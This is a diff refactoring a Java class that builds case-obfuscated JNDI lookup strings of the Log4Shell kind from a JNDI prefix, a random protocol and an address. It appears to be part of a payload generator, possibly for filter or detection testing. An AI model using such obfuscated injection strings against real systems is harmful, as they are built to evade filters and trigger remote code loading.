@@ -11,12 +11,7 @@ class UpperLowerObfuscator extends Obfuscator {
      * @return 難読化を行う前の攻撃パターン（先頭の"${"と最後の"}"を除く）
      */
     String GenerateTargetString() {
-        StringBuilder builder = new StringBuilder();
-        builder.append(jndi);
-        builder.append(ObfuscatorUtils.SelectRandom(proto));
-        builder.append("://");
-        builder.append(address);
-        return builder.toString();
+        return jndi + ObfuscatorUtils.SelectRandom(proto) + "://" + address;
     }
 
     /**
@@ -25,11 +20,7 @@ class UpperLowerObfuscator extends Obfuscator {
      */
     @Override
     String GenerateObfuscatedString() {
-        StringBuilder builder = new StringBuilder();
-        builder.append(first);
-        builder.append(UpperLowerObfuscation(GenerateTargetString()));
-        builder.append("}");
-        return builder.toString();
+        return first + UpperLowerObfuscation(GenerateTargetString()) + "}";
     }
 
     /**
